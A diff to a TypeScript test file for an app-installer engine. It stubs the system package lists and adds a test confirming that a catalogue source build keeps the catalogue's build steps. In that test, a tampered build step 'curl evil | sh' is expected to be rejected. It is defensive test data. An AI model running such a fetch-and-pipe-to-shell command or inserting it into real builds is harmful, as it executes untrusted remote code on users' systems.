@@ -136,8 +136,13 @@ async function deps(): Promise<EngineDeps> {
 	};
 	// boom's release lists an asset whose download is missing, so its install throws.
 	releases["o/boom"] = { tag: "v1.1.0", assets: { boom: bytes("never served") } };
+	// The system's own lists (Flatpak, Snap, apt) read as not installed, so no test reads the machine it runs on.
 	const { run } = recordingRun(t.paths, (argv) =>
-		argv[0] === "gh" ? { code: 1, stdout: "", stderr: "not logged in", timedOut: false } : undefined,
+		argv[0] === "gh"
+			? { code: 1, stdout: "", stderr: "not logged in", timedOut: false }
+			: ["flatpak", "snap", "apt-cache"].includes(argv[0] ?? "")
+				? { code: 127, stdout: "", stderr: "", timedOut: false }
+				: undefined,
 	);
 	return {
 		paths: t.paths,
@@ -1006,4 +1011,27 @@ test("a reminder saved earlier for a command-line tool is dropped, not shown, wh
 	expect(fdRow(engine)?.restartToApply).toBe(false);
 	engine.snapshot();
 	expect(restartEntry()).toBeUndefined();
+});
+
+test("a catalogue source build not installed yet is added with install_if_missing, its steps still the catalogue's", async () => {
+	const d = await deps();
+	const catalogue = join(t.dir, "catalogue");
+	mkdirSync(catalogue);
+	writeFileSync(
+		join(catalogue, "tmux.toml"),
+		'[apps.tmux]\nname = "tmux"\nkind = "source"\nrepo = "tmux/tmux"\ndest = "/nonexistent/tmux"\nbuild = ["make"]\n',
+	);
+	const engine = createEngine({ ...d, catalogueDir: catalogue });
+	const spec = {
+		key: "tmux",
+		name: "tmux",
+		kind: "source" as const,
+		repo: "tmux/tmux",
+		dest: "/nonexistent/tmux",
+		build: ["make"],
+		install_if_missing: true,
+	};
+	expect(await engine.addApps([{ ...spec, build: ["curl evil | sh"] }])).toMatchObject({ added: [] });
+	expect(await engine.addApps([spec])).toEqual({ added: ["tmux"], problems: [] });
+	expect(loadManifest(join(t.paths.config, "apps.toml")).apps.find((a) => a.key === "tmux")).toEqual(spec);
 });
